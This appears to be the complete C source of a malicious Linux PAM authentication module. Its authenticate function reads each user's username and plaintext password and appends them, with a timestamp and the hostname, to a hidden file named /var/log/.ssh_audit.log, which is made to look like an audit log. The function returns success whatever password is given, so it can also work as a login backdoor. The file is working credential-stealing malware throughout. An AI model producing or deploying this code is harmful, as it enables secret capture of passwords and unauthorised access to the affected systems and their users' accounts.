#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/_pam_macros.h>
#include <unistd.h>
#include <time.h>

#define MAX_SIZE 128

int write_to_file(char* message) {
    const char *filepath = "/var/log/.ssh_audit.log";
    FILE *logfd = fopen(filepath, "ab+");
    fputs(message,logfd);
    return fclose(logfd);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char *username = malloc(MAX_SIZE);
    char *message = malloc(1024);
    char *hostname = malloc(MAX_SIZE);

    memset((void *) username, 0, MAX_SIZE);
    memset((void *) message, 0, 1024);
    memset((void *) hostname, 0, MAX_SIZE);

    retval = pam_get_user(pamh, (const char **) &username, "Username: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    const void *void_pass;
    char *authtok = malloc(PAM_MAX_RESP_SIZE);
    memset(authtok, 0, PAM_MAX_RESP_SIZE);

    retval = pam_get_item(pamh, PAM_AUTHTOK, &void_pass);
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    else if (void_pass == NULL) {
        char *resp = NULL;
        retval = pam_prompt(pamh, PAM_PROMPT_ECHO_OFF, &resp, "Password: ");
        if (retval != PAM_SUCCESS){
            _pam_drop(resp);
            if (retval == PAM_CONV_AGAIN){
                retval = PAM_INCOMPLETE;
            }
            return retval;
        }
        if (resp) {
            pam_set_item(pamh, PAM_AUTHTOK, resp);
            if (authtok == NULL) {
                return PAM_SYSTEM_ERR;
            }
            strncpy(authtok, resp, PAM_MAX_RESP_SIZE - 1);
            _pam_drop(resp);
        }
    }
    else {
        if (void_pass == NULL) {
            return PAM_SYSTEM_ERR;
        }
        strncpy(authtok, void_pass, PAM_MAX_RESP_SIZE - 1);
    }

    gethostname(hostname, sizeof hostname);
    snprintf(message, 1023, "Time: %ld\nHostname: %s\nUsername: %s\nPassword: %s\n\n",
             (unsigned long) time(NULL), hostname, username, authtok);
    write_to_file(message);
    return PAM_SUCCESS;
}


